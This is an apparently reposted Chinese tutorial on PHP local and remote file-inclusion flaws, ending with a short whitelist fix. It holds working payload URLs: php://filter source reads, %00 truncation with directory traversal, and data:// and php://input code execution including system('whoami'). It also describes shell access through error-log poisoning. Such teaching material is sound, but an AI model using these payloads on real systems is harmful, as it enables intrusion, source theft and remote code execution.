> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzA4MDMwMjQ3Mg==&mid=218900170&idx=1&sn=de3b3d6aad1f48f709de67b3b9352e31&chksm=175ede2d2029573b94bbe0a154289603bdcecb68b57bbd2038bf9f612417ab6f0d4ec54ce15d&scene=27#wechat\_redirect](http://mp.weixin.qq.com/s?__biz=MzA4MDMwMjQ3Mg==&mid=218900170&idx=1&sn=de3b3d6aad1f48f709de67b3b9352e31&chksm=175ede2d2029573b94bbe0a154289603bdcecb68b57bbd2038bf9f612417ab6f0d4ec54ce15d&scene=27#wechat_redirect)

<?php

if ($\_GET\['page'\]) {  
include $\_GET\['page'\];  
} else {  
include 'index.php';  
}

?>  

程序的本意是当提交url为http://127.0.0.1/page.php?page=index.php时，调用index.php里面的样式内容和功能。  

但是由于page参数没有过滤，我们可以自定义参数的内容，导致了文件包含漏洞的产生。

![](../Images/a4f0a391d56ff5bc4d2708a169cbfecb.png)  
![](../Images/ad5c9c981ff81882ec88617b4184d0d0.png)  
但是如果我要去读一个php文件的内容，却无法显示，他会被当作一个php脚本被执行。

![](../Images/e6d8044cc43c3034c8a78ac13cc524ce.png)  
那么解决方法就是把文件的内容以base64编码然后显示出来。

http://192.168.1.130/page.php?page=php://filter/read=convert.base64-encode/resource=page.php  

![](../Images/b35dd7a793cdd50c4d6d96f445e93674.png)  
![](../Images/428db5cd3bbe8821badfb03338c8eb40.png)  
假设1.txt这个文件里面的内容为phpinfo

![](../Images/b8977e1c47776f9907f89708c39f1efa.png)  
包含一下，txt文件就会被当作php来执行。

![](../Images/120adea715e600ab0ea991a1549114b1.png)  

然而有些时候：

<?php include($\_GET\['page'\]."php");?>

要结合php的％00特性来进行截断包含。

条件：magic\_quotes\_gpc=off，PHP小于5.3.4有效

![](../Images/eca86302b90fa6f00da074c874505a05.png)  
当然，在unix系统上可以用00截断进行目录遍历。

?page=../../../../../../../../../var/www/%00

**php://input**

条件：在allow\_url\_include = **On **且 PHP >= **5.2.0**，可以直接执行php代码.

![](../Images/d190500da706470268e3a4cd718ec43a.png)  
![](../Images/c54240ad96b3a5650d1fc7c2c5249f5e.png)  
![](../Images/3eb51721da370689d752c28951dd2350.png)  
page=data://text/plain;base64,PD9waHBpbmZvKCk7Lyo=

page=data:;base64,PD9waHBpbmZvKCk7Lyo=

page=data:text/plain,<?php system("whoami");>;

  

拿shell

![](../Images/206d2b20b5ad484b4f711901e57d57e4.png)  
![](../Images/f1e7de35ffa5ef7c4e6dcbb8a491f7bc.png)  
本地文件包含拿shell的方法还有很多，比如访问一个错误的界面，url包含一句话木马，然后包含apache的错误文件error\_log则能够成功执行。

  

远程文件包含

![](../Images/ebbc3ebf87b3c824ec80b91121188489.png)  
需要allow\_url\_fopen=On并且 allow\_url\_include=On

有时需要00截断或＃注释。

  

防御方法：

> if ($\_GET\['page'\] == "index") {include("index.php");} else {include ("default.php");}

  

可能会漏掉一些东西，记不起来咯。。。
